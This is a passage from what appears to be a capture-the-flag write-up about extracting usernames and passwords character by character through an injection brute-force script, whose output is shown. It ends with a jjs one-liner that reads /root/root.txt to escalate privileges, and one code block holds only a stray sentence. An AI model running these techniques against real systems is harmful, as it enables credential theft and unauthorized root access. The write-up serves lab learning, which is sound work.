There are some differences here. With a password, once I find that the 4th character is “P”, there’s no need to try other characters. That’s not the case with usernames, as “administrator”, “admin”, and “adam” could all be users. 

To solve this, I’ll use recursion. The function takes the valid start of a username as the input and tries that input plus each character. For all that succeed, it calls the same function, passing in the start + the new character. If none of the characters succeed, that means that the passed in string must be the username.

```bash
python3 brute-v4.py
Starting brute-force attack...
[+] Found Username Initials with: a                   
[+] Found Username Initials with: m                   
[+] Found user: ad                                
[+] Found user: adm                        
[+] Found user: admi                        
[+] Found user: admin                        
[+] User found: admin                         
[+] Found password for admin: c        
[+] Found user: ma                        
[+] Found user: man                        
[+] Found user: mang                        
[+] Found user: mango                        
[+] User found: mango                         
[+] Found password for mango: h3mXK8RhU~f{]f5H
```

```txt
Given that I had the correct password for admin, why did SSH fail? The last line of /etc/ssh/sshd_config:
```

```bash
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```